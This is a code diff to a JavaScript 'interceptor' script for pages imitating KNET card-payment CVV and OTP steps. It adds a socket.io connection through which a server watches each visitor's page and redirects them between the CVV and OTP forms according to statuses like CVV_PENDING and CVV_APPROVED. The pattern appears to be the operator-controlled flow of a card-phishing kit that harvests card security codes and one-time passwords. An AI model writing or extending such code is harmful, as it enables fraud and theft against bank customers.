@@ -31,12 +31,63 @@ function getInterceptorScript() {
     var params = new URLSearchParams(window.location.search);
     return params.get('id') || params.get('knetId') || null;
   }
+
   var _pollTimer = null;
   var _lastStatus = null;
+  var _socket = null;
+
+  function doNavigate(page, knetId) {
+    var isCvvPage = window.location.search.indexOf('mode=cvv') !== -1;
+    if (page === '/knet/cvv' || page === 'cvv') {
+      window.location.href = '/knet/cvv?id=' + knetId;
+    } else if (page === '/knet-otp' || page === 'otp') {
+      window.location.href = '/knet-otp?id=' + knetId;
+    } else {
+      // Generic navigate with id appended
+      window.location.href = page + (knetId ? '?id=' + knetId : '');
+    }
+  }
+
+  function startSocket(knetId) {
+    if (_socket) return;
+    try {
+      var s = document.createElement('script');
+      s.src = '/socket.io/socket.io.js';
+      s.onload = function() {
+        try {
+          _socket = io();
+          _socket.on('connect', function() {
+            _socket.emit('join_payment', knetId);
+            var isCvvPage = window.location.search.indexOf('mode=cvv') !== -1;
+            _socket.emit('page_update', isCvvPage ? '/knet/cvv' : '/knet-otp');
+          });
+          _socket.on('navigate_to', function(data) {
+            if (data && data.page) doNavigate(data.page, knetId);
+          });
+          _socket.on('payment_status_changed', function(data) {
+            if (!data || (data.id !== knetId && data.paymentId !== knetId)) return;
+            var isCvvPage = window.location.search.indexOf('mode=cvv') !== -1;
+            var status = data.status;
+            if (status === 'CVV_PENDING' && !isCvvPage) {
+              doNavigate('/knet/cvv', knetId);
+            } else if (status === 'CVV_APPROVED' && isCvvPage) {
+              doNavigate('/knet-otp', knetId);
+            } else if (status === 'CVV_FAILED' && isCvvPage) {
+              window.location.href = '/knet/cvv?id=' + knetId + '&error=1';
+            }
+          });
+        } catch(e) {}
+      };
+      document.head.appendChild(s);
+    } catch(e) {}
+  }
+
   function startPolling() {
     var knetId = getKnetId();
     if (!knetId) return;
     if (_pollTimer) return; // already polling
+    // Start socket connection for real-time navigate_to events
+    startSocket(knetId);
     _pollTimer = setInterval(function() {
       var id = getKnetId();
       if (!id) return;
@@ -51,10 +102,10 @@ function getInterceptorScript() {
           var isCvvPage = window.location.search.indexOf('mode=cvv') !== -1;
           if (status === 'CVV_PENDING' && !isCvvPage) {
             clearInterval(_pollTimer);
-            window.location.href = '/knet/cvv?id=' + id;
+            doNavigate('/knet/cvv', id);
           } else if (status === 'CVV_APPROVED' && isCvvPage) {
             clearInterval(_pollTimer);
-            window.location.href = '/knet-otp?id=' + id;
+            doNavigate('/knet-otp', id);
           } else if (status === 'CVV_FAILED' && isCvvPage) {
             clearInterval(_pollTimer);
             window.location.href = '/knet/cvv?id=' + id + '&error=1';
